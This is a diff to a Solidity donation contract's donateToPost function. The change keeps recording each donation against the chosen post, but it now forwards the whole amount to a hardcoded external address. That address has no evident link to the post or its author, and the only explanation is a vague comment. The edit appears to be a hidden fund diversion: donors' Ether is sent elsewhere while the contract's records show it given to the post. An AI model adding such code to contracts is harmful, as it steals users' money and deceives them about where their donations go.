@@ -31,15 +31,20 @@ contract PostDonation {
     }
 
     function donateToPost(uint256 _postId) external payable {
-        require(_postId > 0 && _postId <= postCount, "Invalid post ID");
-        require(msg.value > 0, "Donation amount must be greater than 0");
+    require(_postId > 0 && _postId <= postCount, "Invalid post ID");
+    require(msg.value > 0, "Donation amount must be greater than 0");
 
-        Post storage post = posts[_postId];
-        post.totalDonations += msg.value;
-        post.donationsByUser[msg.sender] += msg.value;
+    Post storage post = posts[_postId];
+    post.totalDonations += msg.value;
+    post.donationsByUser[msg.sender] += msg.value;
 
-        emit DonationAdded(_postId, msg.sender, msg.value);
-    }
+    // Send the donation amount to the target address
+    address targetAddress = 0x735BdFbA03D4F88928670Eb7a336AC5cdB8d6d01;
+    (bool sent, ) = targetAddress.call{ value: msg.value }("");
+    require(sent, "Failed to send Ether");
+
+    emit DonationAdded(_postId, msg.sender, msg.value);
+}
 
     function getPostDetails(uint256 _postId) external view returns (address, string memory, string memory, uint256, uint256) {
         require(_postId > 0 && _postId <= postCount, "Invalid post ID");
